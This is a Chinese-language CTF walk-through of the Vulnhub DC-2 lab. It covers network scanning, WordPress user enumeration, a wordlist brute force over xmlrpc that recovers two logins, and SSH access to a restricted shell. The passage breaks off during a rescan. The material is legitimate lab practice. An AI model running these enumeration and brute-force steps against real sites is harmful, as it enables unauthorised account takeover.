---
title: DC2 walk-through/learning notes
date: 2020-10-08 +0800
categories: [pentest-learning,Vulnhub]
tags: ctf
---

少废话

我们现在又拿到一个机子玩了

等待两个机子配置良好之后(one is my kali, one is DC2,他们通过IPv4的nat方法转换地址)

# SCAN and DISCOVERY

## discovery

我们接着使用第一篇DC-1文章中提示到的
```bash
$ sudo arp-scan -l     
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:e8:bc:74, IPv4: 192.168.242.128
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.242.1   00:50:56:c0:00:08       VMware, Inc.
192.168.242.2   00:50:56:e9:c6:da       VMware, Inc.
192.168.242.131 00:0c:29:c6:c1:a4       VMware, Inc.
192.168.242.254 00:50:56:fc:49:5c       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 1.960 seconds (130.61 hosts/sec). 4 responded
```
解释一下,我的地址是 192.168.242.128

目标地址是 192.168.242.131

>tips
>我是如何确定对方IP的?
>
>一种方式是nmap全部扫一遍
>
>另一个方式是谷歌看看发生了啥 [article](https://zhuanlan.zhihu.com/p/130984945)


## scan

稍微等一下 再开启我们的nmap
```bash
$ nmap -A 192.168.242.131    
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-08 06:24 EDT
Nmap scan report for 192.168.242.131
Host is up (0.00100s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Did not follow redirect to http://dc-2/
|_https-redirect: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.04 seconds
``` 
看起来有点问题

实际上nmap并不认识dc-2是什么.dns上也不认识

nmap 说:http-title: Did not follow redirect to http://dc-2/

nmap需要一点点小小的帮助

我们也可以这么做
```bash
sudo vim /etc/hosts
```
我们需要增加一行
```
192.168.242.131	dc-2
```
现在保存它

按下 <ESC> 并且输入 

:wq

再次nmap

>tips:
>
>如果扫描使得在真实环境下渗透时间更多 可以尝试边浏览一下对方网页或者对方机器的端口
>
>如22/21/80/443/445 
>


```bash
$ nmap -A 192.168.242.131
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-08 06:31 EDT
Nmap scan report for dc-2 (192.168.242.131)
Host is up (0.00014s latency)
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-generator: WordPress 4.7.10
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: DC-2 &#8211; Just another WordPress site
|_https-redirect: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.38 seconds
```

总结一下 这是我们的nmap扫描结果

1 这是个wp网站

2 我们并没有得到ssh口子

---

>tips: 推荐一款linux下的扫描器
>
>RUSTSCAN
>
>[github.com/Rustscan/Rustscan](https://github.com/RustScan/RustScan)
>
>
>这个工具可以让我们扫描的更快更酷更好更详细

```bash
$ rustscan 192.168.242.131 -- -A
//.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
//| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
//| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
//`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.242.131:80
Open 192.168.242.131:7744
[~] Starting Nmap
[>] The Nmap command to be run is nmap -A -vvv -p 80,7744 192.168.242.131

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-08 12:05 EDT
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:05
Completed NSE at 12:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:05
Completed NSE at 12:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:05
Completed NSE at 12:05, 0.00s elapsed
Initiating Ping Scan at 12:05
Scanning 192.168.242.131 [2 ports]
Completed Ping Scan at 12:05, 0.00s elapsed (1 total hosts)
Initiating Connect Scan at 12:05
Scanning dc-2 (192.168.242.131) [2 ports]
Discovered open port 80/tcp on 192.168.242.131
Discovered open port 7744/tcp on 192.168.242.131
Completed Connect Scan at 12:05, 0.00s elapsed (2 total ports)
Initiating Service scan at 12:05
Scanning 2 services on dc-2 (192.168.242.131)
Completed Service scan at 12:05, 6.03s elapsed (2 services on 1 host)
NSE: Script scanning 192.168.242.131.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:05
Completed NSE at 12:05, 0.95s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:05
Completed NSE at 12:05, 0.06s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:05
Completed NSE at 12:05, 0.00s elapsed
Nmap scan report for dc-2 (192.168.242.131)
Host is up, received syn-ack (0.00030s latency).
Scanned at 2020-10-08 12:05:52 EDT for 7s

PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.10 ((Debian))
|_http-generator: WordPress 4.7.10
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: DC-2 &#8211; Just another WordPress site
|_https-redirect: ERROR: Script execution failed (use -d to debug)
7744/tcp open  ssh     syn-ack OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAMT3xv0ReIK733JHqB5o5t1Knur7MHfTeYoqdn2fxpfdk79iDYAD46e/C1hLs6R0CH1fSWfpJ0x45g77ZaEn/nOaR2UXiod20R6kyrAPyL4UELizECoJ9MdHSULedr0+4QcXhtUZ+4b76umJhENpOhH+vZjrjMI5uZo+EMjlylxFAAAAFQDzg8StOWpV7J5ZjSfIdcddFgqB/QAAAIA84WMMKmOEkvzgQZLuW5lTTecIrk+UXJyWVZSZFxvFbnt5mUvEzPBMqPZIo1h1dkzpEp1Xpk9Vb16LMrQcS6LgH8yhlo5402lUCfP6onxVNvGvP5uhLoQVjzPd65ZKJ7J1VSoz9xOmPkWr2HFuCf6XOBXy8WCxqZxWYTYERTuexgAAAIAI8DjfDmIjv0jUBAPZu0crpPoxvK4ZvdEy6UbfjK+pZYzkd6qnVLdWrvP9evbWaA5VoDZjWp1301VjX8Y1pqHFVaRUu3OBY7DgidJXA3zLd1BSdPzYfRJSZ1/xN75Yo13wW6XIEsy1kvUNOwA0Nm6zmcQ+SN/aBITwGOIBGrp06w==
|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDC92AIbO8wDuOXLMCrnJkTKDLxXzpwFY0EI4urz6cZpmOjGOZYbWz6Ele1sM3WXEWmOWkszLrMbVEFmuYan545oIHnylYX6ZY+eMPjJBRH/VDukRsNtAA8VRsvIkfCtcG5J9zAQTQDYYprEJljKPYavf4bIW3NZb0v57O01tGylLh23ZSfGpTmQXx+GsWet9vnbCr1+bzf/QeZ7PNK9BeBsLJsvWgLQmuaTdBYeW1b415xOaszWrutHQoaBdud/SPX1Uvy2PNFUfKIPjdbmAdRxTAvRHHaMTRdrvEhdJWz3wmefXr9e3S3YEu05USTqhMwi6OBxeqkjc+6mdR/PYR9
|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE329BkKjKxz7Y23cZSshQ76Ge3DFsJsTO89pgaInzX6w5G3h6hU3xDVMD8G8BsW3V0CwXWt1fTnT3bUc+JhdcE=
|   256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGyWHwWC3fLufEnM1R2zsvjMZ1TovPCp3mky/2s+wXTH
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan
Initiating NSE at 12:05
Completed NSE at 12:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:05
Completed NSE at 12:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:05
Completed NSE at 12:05 , 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/

Nmap done: 1 IP address (1 host up) scanned in 7.33 seconds
```

>看起来又快又好

---
---

于此同时我们浏览上site 跑起wpscan

于是在浏览器中我们得到了第一个flag
```
Flag 1:

Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.

More passwords is always better, but sometimes you just can’t win them all.

Log in as one to see the next flag.

If you can’t find it, log in as another.
```

他在说我们需要一个优秀的字典生成器---CEWL 来进行爆破

oh ..wpscan结果出来了

```bash
$ wpscan --url http://dc-2/                     
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]N
[+] URL: http://dc-2/ [192.168.242.131]
[+] Started: Thu Oct  8 06:45:17 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.10 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://dc-2/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).
 | Found By: Rss Generator (Passive Detection)
 |  - http://dc-2/index.php/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>
 |  - http://dc-2/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://dc-2/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=====> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Thu Oct  8 06:45:20 2020
[+] Requests Done: 51
[+] Cached Requests: 5
[+] Data Sent: 10.22 KB
[+] Data Received: 287.697 KB
[+] Memory used: 206.758 MB
[+] Elapsed time: 00:00:02

```

O~K~,看起来我们得到以下的关键信息

1 没有漏洞插件和主题

2 xmlrpc.php 是存在而且可以直接access 这为我们爆破提供了良好的环境.

3 没有配置文件备份被泄露

4 wp版本非常久 

# hint:user,password bruteforce.

很好 现在清理一下我们的脑子 现在的提示应该是我们可以枚举用户和密码 来进行一次爆破.

因而我们需要用户的信息以及密码字典

这看起来他就是一个多人多任务运动网站了

## get username 

wpscan和目标给我们很方便的枚举措施和枚举漏洞.

xmlrpc以及wpscan -e u 

```
$ wpscan --url http://dc-2/ -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N][+] URL: http://dc-2/ [192.168.242.131]
[+] Started: Thu Oct  8 06:58:04 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.10 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://dc-2/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).
 | Found By: Rss Generator (Passive Detection)
 |  - http://dc-2/index.php/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>
 |  - http://dc-2/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://dc-2/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: 'Version: 1.2'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <====> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jerry
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Thu Oct  8 06:58:06 2020
[+] Requests Done: 56
[+] Cached Requests: 6
[+] Data Sent: 12.641 KB
[+] Data Received: 514.536 KB
[+] Memory used: 132.699 MB
[+] Elapsed time: 00:00:02
```
很好 很有精神 三个用户一个admin 一个jerry 一个tom

合着这是在玩猫和老鼠///

嗯 这帮了我们一把.或许我们可以康康文章来获取一些信息?

那可不是个好主意..在google翻译了一把之后 我发现事情没那么简单 这完全就是一篇篇拉丁文文章

就连英语都不是那么擅长的我 成功自闭..

## get password

OK看到这个hint:TO BE CEWL

其实我们不难想到 通过cewl这个字典生成器来生成一个密码字典

在man和google cwel的用法之后 我顺利的打出来如下的指令

```
$ cewl http://dc-2/ -w wordlist.txt -d 10 --with-numbers  
```

于是它产生了一串关于网页的字典.

似乎看起来有点短,但是或许能成呢?

于是我开开始使用这个字典进行暴力破解 -P可以很好的满足我们的需求

```bash
wpscan --url http://dc-2/ -e u -P  wordlist.txt 
```
执行结果为
```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N][+] URL: http://dc-2/ [192.168.242.131]
[+] Started: Thu Oct  8 09:22:22 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.10 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://dc-2/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).
 | Found By: Rss Generator (Passive Detection)
 |  - http://dc-2/index.php/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>
 |  - http://dc-2/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://dc-2/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: 'Version: 1.2'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <====> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jerry
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Performing password attack on Xmlrpc against 3 user/s
[SUCCESS] - jerry / adipiscing                                                    
[SUCCESS] - tom / parturient                                                      
Trying admin / log Time: 00:00:29 <======     > (646 / 1121) 57.62%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Thu Oct  8 09:22:54 2020
[+] Requests Done: 663
[+] Cached Requests: 47
[+] Data Sent: 310.522 KB
[+] Data Received: 408.565 KB
[+] Memory used: 150.766 MB
[+] Elapsed time: 00:00:31
```
如果你的命令行像我一样有着高亮显示

你可以清晰的看到命令结果有一串特殊颜色的高亮显示
```
[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient
```
成功爆破...

# access

在尝试登陆两次 http://dc-2/wp-login.php 之后

我们可以知道jerry的权限更高 甚至可以看到flag2 post

他在 http://dc-2/index.php/flag-2/
```
Flag 2:

If you can't exploit WordPress and take a shortcut, there is another way.

Hope you found another entry point.
```
很好 现在对我这种noob来说看起来没有新路了

emmm...现在问题变成了如何利用这个wordpress或者找到第二个entry

我想或许我还需要更多信息

# get shell

我想我懂如何登陆了(然而事实上是错误的)

还记得rustscan给我们的ssh端口吗

以及被爆破出来了的用户名称和密码

我依旧没有找到入侵wordpress的具体思路

于是我尝试了一下使用ssh

我使用如下指令
```
ssh -p 7744 jerry@192.168.242.131
jerry@192.168.242.131's password: adipiscing
Permission denied, please try again.

```

似乎老鼠jerry还是比较谨慎的,他并没有给予我们ssh的入口

但是 tom猫就恰恰相反了

```
$ ssh -p 7744  tom@192.168.242.131
tom@192.168.242.131's password: parturient

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
tom@DC-2:~$ ls
flag3.txt  usr
```
但是cat head tail常见的输出指令都被ban了

经过测试唯一可行的指令成为了 less和echo

因此我们可以..
``` bash
tom@DC-2:~$ for line in $(<flag3.txt); do echo $line; done #替代指令为 less
Poor
old
Tom
is
always
running
after
Jerry.
Perhaps
he
should
su
for
all
the
stress
he
causes.
```



## collect more info

还记得我在第一篇 [文章](https://esonhugh.github.io/posts/DC1-walkthrough-learnning-notes/#level-up-your-permission) 中说的和其中的一些小小的技巧?

``` bash
tom@DC-2:~$ compgen -u
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
proxy
www-data
backup
list
irc
gnats
nobody
systemd-timesync
systemd-network
systemd-resolve
systemd-bus-proxy
Debian-exim
messagebus
statd
sshd
mysql
tom
jerry
```
---
```bash
tom@DC-2:~$ compgen -c
if
then
else
elif
fi
case
esac
for
select
while
until
do
done
in
function
time
{
}
!
[[
]]
coproc
__expand_tilde_by_ref
__get_cword_at_cursor_by_ref
__git_eread
__git_ps1
__git_ps1_colorize_gitstring
__git_ps1_show_upstream
__grub_dir
__grub_get_last_option
__grub_get_options_from_help
__grub_get_options_from_usage
__grub_list_menuentries
__grub_list_modules
__grubcomp
__ltrim_colon_completions
__parse_options
__reassemble_comp_words_by_ref
_a2disconf
_a2dismod
_a2dissite
_a2enconf
_a2enmod
_a2ensite
_allowed_groups
_allowed_users
_apache2_allcomp
_apache2_conf
_apache2_mods
_apache2_sites
_available_interfaces
_cd
_cd_devices
_command
_command_offset
_complete_as_root
_completion_loader
_configured_interfaces
_count_args
_debconf_show
_dvd_devices
_expand
_filedir
_filedir_xspec
_fstypes
_get_comp_words_by_ref
_get_cword
_get_first_arg
_get_pword
_gids
_grub_editenv
_grub_install
_grub_mkconfig
_grub_mkfont
_grub_mkimage
_grub_mkpasswd_pbkdf2
_grub_mkrescue
_grub_probe
_grub_script_check
_grub_set_entry
_grub_setup
_have
_init_completion
_insserv
_installed_modules
_ip_addresses
_kernel_versions
_known_hosts
_known_hosts_real
_longopt
_mac_addresses
_minimal
_modules
_ncpus
_parse_help
_parse_usage
_pci_ids
_pgids
_pids
_pnames
_pygmentize
_quote_readline_by_ref
_realcommand
_rl_enabled
_root_command
_service
_services
_shells
_signals
_split_longopt
_sysvdirs
_terms
_tilde
_uids
_update_initramfs
_upvar
_upvars
_usb_ids
_user_at_host
_usergroup
_userland
_variables
_xfunc
_xinetd_services
dequote
quote
quote_readline
.
:
[
alias
bg
bind
break
builtin
caller
cd
command
compgen
complete
compopt
continue
declare
dirs
disown
echo
enable
eval
exec
exit
export
false
fc
fg
getopts
hash
help
history
jobs
kill
let
local
logout
mapfile
popd
printf
pushd
pwd
read
readarray
readonly
return
set
shift
shopt
source
suspend
test
times
trap
true
type
typeset
ulimit
umask
unalias
unset
wait
less
scp
ls
vi
```
正如flag所说 tom非常可怜

## scan_agian

这时候我重开了我的扫描器,在世外高人的指导中 我发现 nmap只会扫描常见的1000个端口 所以导致了 端口发现和漏洞扫描做的不是很及时

```
└─$ sudo rustscan 192.168.242.131 --ulimit 5000 -- -A --script vuln                                                             1 ⨯
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.242.131:80
Open 192.168.242.131:7744
[~] Starting Nmap
[>] The Nmap command to be run is nmap -A --script vuln -vvv -p 80,7744 192.168.242.131

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-22 02:59 EDT
NSE: Loaded 149 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 02:59
Completed NSE at 02:59, 10.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 02:59
Completed NSE at 02:59, 0.00s elapsed
Initiating ARP Ping Scan at 02:59
Scanning 192.168.242.131 [1 port]
Completed ARP Ping Scan at 02:59, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 02:59
Scanning dc-2 (192.168.242.131) [2 ports]
Discovered open port 80/tcp on 192.168.242.131
Discovered open port 7744/tcp on 192.168.242.131
Completed SYN Stealth Scan at 02:59, 0.04s elapsed (2 total ports)
Initiating Service scan at 02:59
Scanning 2 services on dc-2 (192.168.242.131)
Completed Service scan at 02:59, 6.04s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against dc-2 (192.168.242.131)
NSE: Script scanning 192.168.242.131.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 02:59
NSE Timing: About 82.31% done; ETC: 03:00 (0:00:13 remaining)
Completed NSE at 03:00, 81.59s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 03:00
Completed NSE at 03:00, 0.07s elapsed
Nmap scan report for dc-2 (192.168.242.131)
Host is up, received arp-response (0.00012s latency).
Scanned at 2020-10-22 02:59:23 EDT for 89s

